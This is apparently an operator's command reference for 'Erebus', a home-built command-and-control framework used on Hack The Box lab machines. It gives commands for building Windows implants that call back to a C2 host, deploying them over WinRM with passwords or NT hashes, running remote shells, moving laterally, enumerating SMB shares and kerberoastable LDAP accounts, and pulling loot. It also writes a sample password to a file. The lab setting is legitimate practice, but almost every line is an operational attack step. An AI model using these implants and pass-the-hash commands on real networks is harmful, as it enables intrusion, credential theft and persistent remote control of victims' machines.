# Erebus HTB — command reference

## Build

```bash
cd "/home/zero/Downloads/Zypheron project/Erebus"
make proto erebus
make implant-win CALLBACK_URL=https://<C2>:443 SLEEP_MS=500 JITTER_PCT=10
make implant-c   # Windows C PE when mingw available
bash scripts/smoke_test.sh
```

## Serve / operator

```bash
./build/erebus serve
# other terminal
./build/erebus operator   # or unified CLI

# Dual-seat certs (operator + approver) for lab auto-approve
./build/erebus certs seats

# One-shot operator (auto-approves with approver cert)
./build/erebus op sessions
./build/erebus op shell -- whoami
./build/erebus op lateral winrm 10.10.10.10 "whoami" --user u --domain DOM --hash <NT>
./build/erebus op pending
./build/erebus op approve-all
```

## Deploy Windows implant via WinRM

```bash
# password in file (never bash $$ secrets)
python3 scripts/deploy_winrm.py --host <IP> --user Administrator \
  --pass-file /path/pass.txt --implant build/implant.exe

# NT hash (32 hex or LM:NT)
python3 scripts/deploy_winrm.py --host <IP> --user 'msa_health$' --domain LOGGING \
  --hash-file /path/nt.txt --implant build/implant.exe
```

## Soft path (post-session)

```text
sessions
use <session-id>
shell whoami
ifconfig
smb list_shares --host <IP> --anon
smb list_dir --host <IP> --share <name> --anon
smb download --host <IP> --share <name> --path <file> --user u --pass p
ldap-enum interesting --domain DOM --dc DC --user u --pass p
ldap-enum kerberoastable --domain DOM --dc DC --hash <NT>
lateral winrm <host> "whoami /all" --user u --pass p --domain DOM
lateral winrm <host> "whoami" --user u --hash <NT> --domain DOM
pending
approve <id>
loot
```

## Secrets without bash $$ expansion

```bash
python3 -c 'open("svc_pass.txt","w").write(r"Em3rg3ncyPa$$2026")'
```

## Paths

| Item | Path |
| --- | --- |
| DB | `~/.erebus/erebus.db` |
| Config | `~/.erebus/server.yaml` |
| Certs | `~/.erebus/certs/` |
| Eng workdir | `~/htb-<machine>/` |
| Reports | `reports/htb-<machine>/` |
| Runbook | `docs/HTB_NEXT_RUNBOOK.md` |
| AD cookbook | `docs/AD_ENGAGEMENT.md` |
